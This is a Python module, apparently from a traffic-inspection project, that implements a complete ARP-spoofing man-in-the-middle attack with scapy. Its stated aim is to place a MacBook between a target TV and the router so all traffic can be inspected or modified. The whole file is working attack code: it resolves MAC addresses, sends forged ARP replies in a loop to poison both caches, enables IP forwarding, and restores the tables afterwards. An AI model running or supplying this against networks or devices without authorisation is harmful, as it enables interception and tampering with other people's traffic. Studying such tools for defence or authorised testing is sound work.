"""ARP spoofing module to intercept traffic between a target device and the gateway.

This positions the MacBook as a man-in-the-middle between the target TV
and the router, allowing all traffic to flow through for inspection/modification.
"""

import signal
import threading
import time
from typing import Optional

from scapy.all import ARP, Ether, get_if_hwaddr, getmacbyip, send, sendp, srp, conf

from .utils import enable_ip_forwarding, disable_ip_forwarding


class ARPSpoofer:
    """ARP spoofer that redirects a target's traffic through this machine."""

    def __init__(
        self,
        target_ip: str,
        gateway_ip: str,
        interface: str,
        restore_on_stop: bool = True,
        interval: float = 2.0,
    ):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.restore_on_stop = restore_on_stop
        self.interval = interval

        self._running = False
        self._thread: Optional[threading.Thread] = None

        # Resolve MAC addresses
        self.own_mac = get_if_hwaddr(interface)
        self.target_mac = self._resolve_mac(target_ip)
        self.gateway_mac = self._resolve_mac(gateway_ip)

        if not self.target_mac:
            raise RuntimeError(
                f"Could not resolve MAC address for target {target_ip}. "
                "Is the device on the network?"
            )
        if not self.gateway_mac:
            raise RuntimeError(
                f"Could not resolve MAC address for gateway {gateway_ip}. "
                "Check your network connection."
            )

    def _resolve_mac(self, ip: str) -> Optional[str]:
        """Resolve an IP address to a MAC address using ARP."""
        # Try scapy's built-in first
        mac = getmacbyip(ip)
        if mac and mac != "ff:ff:ff:ff:ff:ff":
            return mac

        # Fall back to manual ARP request
        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        conf.iface = self.interface
        answered, _ = srp(arp_request, timeout=3, verbose=False, iface=self.interface)
        for _, received in answered:
            return received[Ether].src
        return None

    def _build_spoof_packet(self, target_ip: str, target_mac: str, spoof_ip: str) -> ARP:
        """Build an ARP reply that tells target_ip we are spoof_ip."""
        return ARP(
            op=2,  # ARP reply
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip,
            # hwsrc defaults to our own MAC
        )

    def _build_restore_packet(
        self, target_ip: str, target_mac: str, real_ip: str, real_mac: str
    ) -> ARP:
        """Build an ARP reply to restore the real MAC mapping."""
        return ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=real_ip,
            hwsrc=real_mac,
        )

    def _spoof_loop(self) -> None:
        """Continuously send spoofed ARP packets."""
        # Tell target: "I am the gateway"
        pkt_to_target = self._build_spoof_packet(
            self.target_ip, self.target_mac, self.gateway_ip
        )
        # Tell gateway: "I am the target"
        pkt_to_gateway = self._build_spoof_packet(
            self.gateway_ip, self.gateway_mac, self.target_ip
        )

        while self._running:
            send(pkt_to_target, verbose=False, iface=self.interface)
            send(pkt_to_gateway, verbose=False, iface=self.interface)
            time.sleep(self.interval)

    def start(self) -> None:
        """Start ARP spoofing (enables IP forwarding first)."""
        if self._running:
            return

        enable_ip_forwarding()

        self._running = True
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        """Stop ARP spoofing and optionally restore ARP tables."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
            self._thread = None

        if self.restore_on_stop:
            self.restore()

    def restore(self) -> None:
        """Restore original ARP tables for target and gateway."""
        restore_target = self._build_restore_packet(
            self.target_ip, self.target_mac,
            self.gateway_ip, self.gateway_mac,
        )
        restore_gateway = self._build_restore_packet(
            self.gateway_ip, self.gateway_mac,
            self.target_ip, self.target_mac,
        )
        # Send multiple times to ensure delivery
        for _ in range(5):
            send(restore_target, verbose=False, iface=self.interface)
            send(restore_gateway, verbose=False, iface=self.interface)
            time.sleep(0.3)

    @property
    def is_running(self) -> bool:
        return self._running

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *args):
        self.stop()
